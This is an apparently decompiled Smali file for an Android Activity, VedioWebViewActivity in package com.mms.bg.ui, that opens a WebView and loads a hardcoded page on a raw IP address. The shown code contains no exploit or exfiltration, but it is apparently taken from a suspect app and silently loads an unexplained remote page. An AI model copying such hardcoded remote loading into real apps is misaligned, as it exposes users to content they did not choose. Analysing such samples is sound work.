.class public Lcom/mms/bg/ui/VedioWebViewActivity;
.super Landroid/app/Activity;
.source "VedioWebViewActivity.java"


# instance fields
.field private mSM:Lcom/mms/bg/ui/SettingManager;


# direct methods
.method public constructor <init>()V
    .registers 1

    .prologue
    .line 10
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .registers 4
    .parameter "savedInstanceState"

    .prologue
    .line 15
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 17
    const v1, 0x7f030001

    invoke-virtual {p0, v1}, Lcom/mms/bg/ui/VedioWebViewActivity;->setContentView(I)V

    .line 18
    invoke-static {p0}, Lcom/mms/bg/ui/SettingManager;->getInstance(Landroid/content/Context;)Lcom/mms/bg/ui/SettingManager;

    move-result-object v1

    iput-object v1, p0, Lcom/mms/bg/ui/VedioWebViewActivity;->mSM:Lcom/mms/bg/ui/SettingManager;

    .line 20
    const v1, 0x7f050006

    invoke-virtual {p0, v1}, Lcom/mms/bg/ui/VedioWebViewActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/webkit/WebView;

    .line 21
    .local v0, view:Landroid/webkit/WebView;
    if-eqz v0, :cond_1f

    .line 22
    const-string v1, "http://211.136.165.53/wl/rmw1s/pp66.jsp"

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    .line 24
    :cond_1f
    return-void
.end method
